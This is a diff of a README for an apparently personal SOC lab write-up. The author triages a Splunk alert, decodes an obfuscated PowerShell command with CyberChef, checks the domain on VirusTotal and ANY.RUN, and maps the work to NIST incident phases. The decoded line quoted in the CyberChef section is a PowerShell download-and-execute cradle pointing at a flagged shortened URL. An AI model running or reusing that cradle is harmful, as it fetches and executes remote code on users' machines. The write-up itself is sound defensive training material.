@@ -4,7 +4,7 @@
  
 
 <h2>Introduction/Description</h2>
-This project consists of a virtual lab SOC event simulation that I created. For this lab I was presented with log data that would purposely trigger an alert on the SIEM tool(Splunk) that was running on my network. With the snapshots of data and tools that I used to investigate this alert. I will walk you through my thought process of how I triaged this whole event.
+This project involves a virtual lab SOC event simulation that I created. In this lab, I was presented with log data intentionally designed to trigger an alert on the SIEM tool (Splunk) running on my network. Using snapshots of the data and tools, I will guide you through my thought process on how I triaged this entire event.
 <br />
 
 
@@ -29,7 +29,7 @@ This project consists of a virtual lab SOC event simulation that I created. For 
  
 ## SPLUNK EVENT ALERT:
 <img src="https://i.imgur.com/TtKAjut.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
- <br />As shown in the splunk window, this is the event for the alert that we received in splunk. The alert I received was for an execution of a process that is Obfuscated. In the splunk event viewer you can see the information provided such as time and date of the event, event Id, name of the user, username login of the user, type of ingested log data and more.
+ <br />As displayed in the Splunk window, this is the event triggered by the alert we received. The alert I received pertains to the execution of a process that is obfuscated. In the Splunk event viewer, you can observe information such as the time and date of the event, event ID, name of the user, username login of the user, type of ingested log data, and more. 
 <br />
 
 ## SPLUNK EVENT ALERT :
@@ -42,29 +42,33 @@ This project consists of a virtual lab SOC event simulation that I created. For 
 
 ## CYBER CHEF: <br/>
 <img src="https://imgur.com/YPxZFGM.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
-<br /> As you take a look at the process command line you can see that it obfuscated. After .exe which is the execute process you can see that it has -enc to encode the actual execution. So to see what the process command line is trying to do we need to decode it to see if it is malicious. As you can see I used a decryption tool called cyber chef. The output result I would get would be "iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")" which basically directs a user to the specified URL listed and allows them to download contents of the listed URL.
+<br /> As you examine the process command line, you can observe that it is obfuscated. Following the ".exe," which represents the execution process, you can see the presence of "-enc" to encode the actual execution. To understand what the process command line is attempting to do, it's necessary to decode it and assess its potential malicious nature. In this instance, I utilized a decryption tool called CyberChef. The output result reveals "iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")", which essentially directs a user to the specified URL, allowing them to download contents from the listed URL.
 <br />
 
 ## VIRUS TOTAL REPORT:  <br/>
 <img src="https://i.imgur.com/TalzEiR.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
-<br /> As we continue with this investigation we can already see that this is suspicious activity on the network. First the process command line was Obfuscated and Second we found out that execution of the process command line leads the user to URL which allows them to download unknown files. The next step in our investigation is to check and see if the website from the process is malicious or not. I did this with a tool called Virus total and the results would confirm that the website is indeed malicious. In the report it gave me a score of 11/90. Which means that 11 security vendors have marked this domain name as malicious.
+<br /> Continuing with this investigation, we can already identify suspicious activity on the network. Firstly, the process command line was obfuscated. Secondly, we discovered that the execution of the process command line directs the user to a URL, enabling them to download unknown files. The next step in our investigation involves checking whether the website from the process is malicious or not. I accomplished this using a tool called VirusTotal, and the results confirmed that the website is indeed malicious. The report provided a score of 11/90, signifying that 11 security vendors have flagged this domain name as malicious. 
 
 <br />
  
  ## INVESTIGATION REPORT: <br/>
 <img src="https://imgur.com/pTrCtro.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
-<br /> After my triage of this event and confirming that this is a malicious act on the network I then created an investigation report. In a real life scenario the report would be sent to the incident response team in my SOC.
+<br /> After triaging this event and confirming that it is a malicious act on the network, I proceeded to create an investigation report. In a real-life scenario, this report would be sent to the incident response team in my SOC..
 <br />
 
 ## SANDBOX RESULTS:  <br/>
 <img src="https://imgur.com/xHssB4C.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>  
-<br /> After completion of my investigation report on the incident. I decided to do some analysis on the Malicious domain. I used a sandbox tool called ANY.RUN. What I learned about this malicious domain is that when you go to this site there are connections to a lot of different IP addresses that are outside of the United states. With further investigation with virus total I found out that some of the IP addresses with these connections have been marked as malicious. I was also able to find out with further investigation that some of the IP addresses that are not marked as malicious have connections and communications  with malicious files. Below is one of the malicious files an IP address that resonates from Germany has a connection with. This IP address was also making connections to the same Domain that was investigated in my report. This is one of the few Ip Address that were either marked as malicious or have been reported on virus total as an IP address that has connections and communications with malicious files.
+<br /> Upon completing my investigation report on the incident, I decided to conduct some analysis on the malicious domain using a sandbox tool called ANY.RUN. What I discovered about this malicious domain is that when you visit the site, there are connections to various IP addresses located outside of the United States. Further investigation with VirusTotal revealed that some of these IP addresses with connections have been marked as malicious.
+
+Moreover, additional research uncovered that some of the IP addresses not marked as malicious have connections and communications with malicious files. Below is one example of a malicious file associated with an IP address originating from Germany. This IP address was also establishing connections to the same domain investigated in my report. This represents one of the IP addresses that were either marked as malicious or reported on VirusTotal as having connections and communications with malicious files.
 <br />
 <img src="https://imgur.com/ElTze1c.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 
 
 ## SAND BOX THREAT ALERTS:  <br/>
-<img src="https://imgur.com/5ffb460.png" height="80%" width="80%" alt="Disk Sanitization Steps"/> <br/> Towards the end of my analysis I wasn't able to find any actual attacks to the system. However I was able to find a lot of suspicious activity that was taking place on the system when a user visited that domain. The only threat alert I found on the sandbox was a potentially bad traffic alert. This also ran the iexplore.exe process which could have allowed the malicious actor access to potentially do some phsising while a user is on that domain. I would however recommend the incident response team to run a more comprehensive analysis since that is what they specialize in.
+<img src="https://imgur.com/5ffb460.png" height="80%" width="80%" alt="Disk Sanitization Steps"/> <br/> Towards the end of my analysis, I wasn't able to identify any actual attacks on the system. However, I did uncover a significant amount of suspicious activity occurring when a user visited that domain. The only threat alert I found on the sandbox was a potentially bad traffic alert. This alert also triggered the iexplore.exe process, potentially granting the malicious actor access to engage in phishing activities while a user is on that domain.
+
+I would recommend the incident response team to conduct a more comprehensive analysis since that is their area of specialization..
 
 #### Utilizing Computer Incident Handling Guide
 <img src="https://imgur.com/5wt02wN.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
@@ -73,10 +77,12 @@ This project consists of a virtual lab SOC event simulation that I created. For 
 <h2>NIST INCIDENT CYCLE</h2>
 
  
- - <b> PREPARATION: In preparation for this lab I had to configure my SIEM TOOL splunk. I also had to make sure that the alert for an obfuscated  process command line was in my list of alerts . Last thing I had to do was ingest this specific log data to trigger this alert on my splunk. </b>
-- <b> DETECTION/ANALYSIS: The detection portion of this lab was all done through my splunk tool. As soon as the requirements for the alert were met it notified me immediately on my SIEM tool. The analysis portion was done with hands-on interaction with the event in splunk. This consisted of me decrypting the obfuscated process with the tool Cyber chef. Some more analysis that I completed during my investigation was scanning the domain obtained from the process. As shown in the lab I used virus total to confirm that the Domain is malicious. Other analysis that I conducted Include a deeper investigation of the confirmed malicious domain in the sandbox tool ANY.RUN. </b>
-- <b> CONTAINMENT ERADICATION AND RECOVERY: The steps taken for containment,eradication and recovery all depend on organizations methods and policies. But a general overview would be disconnecting the computer from the network for containment. For eradication it could start from just running an anti malware and virus program to locate malicious files and remove them to possibly re imaging the computers operating system and installing it all over again depending on how bad the host is infected. </b>
-- <b> POST INCIDENT ACTIVITY: In this example scenario we had a user process an obfuscated command on their host computer that led to a malicious domain. With Proper investigation we were able to find out information about the malicious activity on the network. All documented information would be shared with all stakeholders within the company where remediation and prevention techniques can be implemented on an incident like this or any similar scenarios. In conclusion the post Incident activity would play as an informative lesson on a malicious event like this.   </b>
+ - <b> PREPARATION: In preparation for this lab, I configured my SIEM TOOL Splunk. I also ensured that the alert for an obfuscated process command line was included in my list of alerts. The last thing I had to do was ingest this specific log data to trigger the alert on my Splunk. </b>
+- <b> DETECTION/ANALYSIS: The detection portion of this lab was all done through my splunk tool. As soon as the requirements for the alert were met it notified me immediately on my SIEM tool. The detection phase of this lab was conducted entirely through my Splunk tool. As soon as the requirements for the alert were met, it notified me immediately on my SIEM tool. The analysis portion involved hands-on interaction with the event in Splunk. This included decrypting the obfuscated process using the CyberChef tool. Additional analysis during my investigation involved scanning the domain obtained from the process. As shown in the lab, I used VirusTotal to confirm that the domain is malicious. Further analysis included a deeper investigation of the confirmed malicious domain in the sandbox tool ANY.RUN. </b>
+- <b> CONTAINMENT ERADICATION AND RECOVERY: The steps taken for containment, eradication, and recovery depend on the organization's methods and policies. A general overview would involve disconnecting the computer from the network for containment. For eradication, it could range from running anti-malware and virus programs to locate malicious files and remove them. For recovery this could possibly be reimaging the computer's operating system and reinstalling it, depending on the severity of the host infection.
+
+ </b>
+- <b> POST INCIDENT ACTIVITY: In this example scenario, a user processed an obfuscated command on their host computer that led to a malicious domain. With proper investigation, we were able to gather information about the malicious activity on the network. All documented information would be shared with all stakeholders within the company where remediation and prevention techniques can be implemented for incidents like this or similar scenarios. In conclusion, post-incident activity serves as an informative lesson on handling malicious events..   </b>
 
 
 </p>
